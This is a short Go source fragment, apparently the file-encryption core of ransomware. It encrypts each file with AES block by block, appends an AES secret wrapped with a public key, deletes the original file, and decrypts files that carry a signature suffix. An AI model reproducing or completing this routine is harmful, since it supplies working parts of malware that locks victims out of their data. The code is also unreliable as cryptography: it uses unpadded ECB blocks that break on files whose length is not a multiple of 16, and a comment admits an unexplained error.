package main

import (
	"crypto/aes"
	"crypto/cipher"
	"strings"
)

func AES(f File) {
	if strings.HasSuffix(f.filename, sig) {
		enc = f.fileBytes[len(f.fileBytes)-32 : len(f.fileBytes)]
		f.fileBytes = f.fileBytes[0 : len(f.fileBytes)-32]
		findDecryptAndSetSecret()
	} else {
		if enc == nil {
			generateKeysAndSetEnc()
		}
	}
	block := createBlock()
	for i := range f.fileBytes {
		if i%16 == 0 {
			if strings.HasSuffix(f.filename, sig) {
				_, err := f.newFile.Write(decrypt(f.fileBytes[i:i+16], block))
				CheckErr(err)
			} else {
				_, err := f.newFile.Write(encrypt(f.fileBytes[i:i+16], block)) //throws an error, no reason y tho
				CheckErr(err)
			}
		}
	}
	if !strings.HasSuffix(f.filename, sig) {
		_, _ = f.newFile.Write(enc) //add the secret that is encrypted with the public key
	}
	f.deleteOldFile()
	_ = f.newFile.Close()
	wg.Done()
}

func createBlock() cipher.Block {
	block, err := aes.NewCipher(secret)
	CheckErr(err)
	return block
}

func encrypt(raw []byte, block cipher.Block) []byte {
	dst := make([]byte, 16)
	block.Encrypt(dst, raw)
	return dst
}

func decrypt(raw []byte, block cipher.Block) []byte {
	dst := make([]byte, 16)
	block.Decrypt(dst, raw)
	return dst
}
